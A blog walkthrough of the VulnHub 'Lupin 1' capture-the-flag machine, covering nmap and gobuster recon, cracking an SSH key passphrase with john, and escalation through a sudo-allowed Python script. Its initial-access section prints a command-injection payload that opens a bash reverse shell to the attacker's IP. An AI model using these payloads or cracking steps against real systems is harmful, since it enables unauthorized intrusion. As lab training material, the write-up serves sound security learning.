---
title: "Lupin 1 — VulnHub CTF Walkthrough"
date: 2025-11-08
author: "Shivam Pakade"
categories: [ctf, vulnhub, writeup]
tags: [Lupin, VulnHub, walkthrough, boot2root]
summary: "Lupin 1 (VulnHub) walkthrough — reconnaissance, web exploitation, reverse shell and privilege escalation to root with screenshots and commands. Chirpy-compatible."
image:
  path: /assets/img/vulnhub/Lupin_1/lupin.jpg
  alt: "Lupin 1 hero image"
---

# Lupin 1 — VulnHub Walkthrough

**Goal:** gain root on the Lupin 1 VM (learning path: recon → web enumeration → RCE → priv-esc).  
**Author:** Shivam Pakade  
**Completed on:** 2025-11-08

> This guide documents lab-only steps. Only apply tests to machines you own/have permission to test.

---

## Table of contents {#toc}

1. [Lab setup](#lab-setup)  
2. [Discovery & Recon](#discovery-and-recon)  
3. [Port & service enumeration (nmap)](#port-service-enumeration-nmap)  
4. [Web enumeration & vulnerability discovery](#web-enumeration-vuln-discovery)  
5. [Initial access — getting a shell](#initial-access-getting-a-shell)  
6. [Privilege escalation to root](#privilege-escalation-to-root)  
7. [Proof & cleanup](#proof-and-cleanup)

---

## Lab setup {#lab-setup}

- Attacker: Kali Linux (example IP: `192.168.120.138`)  
- Target: Lupin 1 VM (example IPs in this writeup)  
- Ensure host-only / NAT network and snapshots before testing.

---

## Discovery & Recon {#discovery-and-recon}

Start with network discovery to find the VM IP:

```bash
netdiscover -r 192.168.120.0/24
# or arp-scan --localnet


You should find the Lupin host (example here uses `192.168.120.139` / `192.168.120.136` depending on snapshot).

**Target banner / console (example):**
[![Lupin console banner]({{ '/assets/img/vulnhub/Lupin_1/after_pass_change_lupin.jpg' | relative_url }})]({{ '/assets/img/vulnhub/Lupin_1/after_pass_change_lupin.jpg' | relative_url }})

---

## Port & service enumeration (nmap) {#port-service-enumeration-nmap}

Run a service/version scan:

```bash
nmap -sS -sV -O -T4 192.168.120.136 -oN scans/lupin_nmap.txt
```

Typical useful output (example):

```
22/tcp   open  ssh      OpenSSH ...
80/tcp   open  http     Apache httpd ...
631/tcp  open  ipp
```

**Nmap screenshot (example):**
[![Nmap results]({{ '/assets/img/vulnhub/Lupin_1/nmap_results.jpg' | relative_url }})]({{ '/assets/img/vulnhub/Lupin_1/nmap_results.jpg' | relative_url }})

Record versions and open services — they guide your next steps.

---

## Web enumeration & vulnerability discovery {#web-enumeration-vuln-discovery}

Browse the web root and run directory discovery:

```bash
gobuster dir -u http://192.168.120.136 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -o scans/gobuster.txt
```

Look for files, hidden directories and any upload or "secret" pages.

**Found a secret directory / file (note and content screenshot):**
[![secret.txt discovered]({{ '/assets/img/vulnhub/Lupin_1/secret.txt.jpg' | relative_url }})]({{ '/assets/img/vulnhub/Lupin_1/secret.txt.jpg' | relative_url }})

The file contains a hint that a private SSH key is stored somewhere and that a passphrase must be cracked.

**Private key / encoded material (screenshot):**
[![private key / cipher]({{ '/assets/img/vulnhub/Lupin_1/private_key.jpg' | relative_url }})]({{ '/assets/img/vulnhub/Lupin_1/private_key.jpg' | relative_url }})

If you find a long base64 blob / private key, save it to disk (`id_rsa`) and set restrictive permissions:

```bash
chmod 600 id_rsa
```

If the key is encrypted, convert for cracking:

```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

**Example — cracked passphrase screenshot:**
[![cracked password]({{ '/assets/img/vulnhub/Lupin_1/carcked_password.jpg' | relative_url }})]({{ '/assets/img/vulnhub/Lupin_1/carcked_password.jpg' | relative_url }})

---

## Initial access — getting a shell {#initial-access-getting-a-shell}

If you obtained a private key and passphrase, SSH into the box as the appropriate user (e.g., `sam`, `arsene`, or as indicated by the site):

```bash
ssh -i id_rsa user@192.168.120.136
# use -o "IdentitiesOnly=yes" if multiple keys loaded
```

Alternatively, some web vulnerabilities provide direct RCE — use a reverse shell payload:

**Reverse shell on attacker:**

```bash
nc -lvnp 4444
```

**Injected payload (example):**

```
127.0.0.1; /bin/bash -i >& /dev/tcp/192.168.120.138/4444 0>&1
```

**If you found an encoded SSH key, decoded output screenshot:**
[![decoded private key output]({{ '/assets/img/vulnhub/Lupin_1/cipher.jpg' | relative_url }})]({{ '/assets/img/vulnhub/Lupin_1/cipher.jpg' | relative_url }})

**If file download / fast requests used to search the site (example):**
[![high request job / scanning]({{ '/assets/img/vulnhub/Lupin_1/scan_progress.jpg' | relative_url }})]({{ '/assets/img/vulnhub/Lupin_1/scan_progress.jpg' | relative_url }})

Once you have a shell, spawn a proper interactive TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z ; stty raw -echo ; fg
export TERM=xterm
```

---

## Privilege escalation to root {#privilege-escalation-to-root}

After initial access, always enumerate:

```bash
id; whoami; uname -a
sudo -l
ps aux --no-heading | head -n 30
find / -perm -4000 -type f 2>/dev/null
```

Look for weak sudo rules or writable scripts. In this box we observed a `NOPASSWD` entry allowing the user to run a utility (example `pip` / `ht` / other) as root.

**Sudo / escalation hint screenshot:**
[![screenshot showing sudo / allowed cmd]({{ '/assets/img/vulnhub/Lupin_1/ssh_file_clue.jpg' | relative_url }})]({{ '/assets/img/vulnhub/Lupin_1/ssh_file_clue.jpg' | relative_url }})

If `sudo -l` shows you can run Python/pip or another tool as root, craft a small script that spawns a root shell — place it in a writable temporary directory and run with sudo:

```bash
# on target
mkdir /tmp/poc && cd /tmp/poc
cat > setup.py <<'PY'
import os,pty
os.execv("/bin/sh", ["/bin/sh","-c","/bin/sh"])
PY

sudo /usr/bin/python3 setup.py
# this should spawn a root shell if python runs as root
```

**Example escalation to root confirmation screenshot:**
[![root flag location / proof]({{ '/assets/img/vulnhub/Lupin_1/root_flag_location.jpg' | relative_url }})]({{ '/assets/img/vulnhub/Lupin_1/root_flag_location.jpg' | relative_url }})

**Root flag screenshot (proof):**
[![root flag]({{ '/assets/img/vulnhub/Lupin_1/root_flag.jpg' | relative_url }})]({{ '/assets/img/vulnhub/Lupin_1/root_flag.jpg' | relative_url }})

---

## Proof and cleanup {#proof-and-cleanup}

Collect minimal proof (uid, id, root.txt contents). Example commands:

```bash
whoami
id
cat /root/root.txt
```

**Proof (uid=0 and root.txt) shown above.** After collecting evidence, revert the VM snapshot and remove any files you uploaded during testing.

---

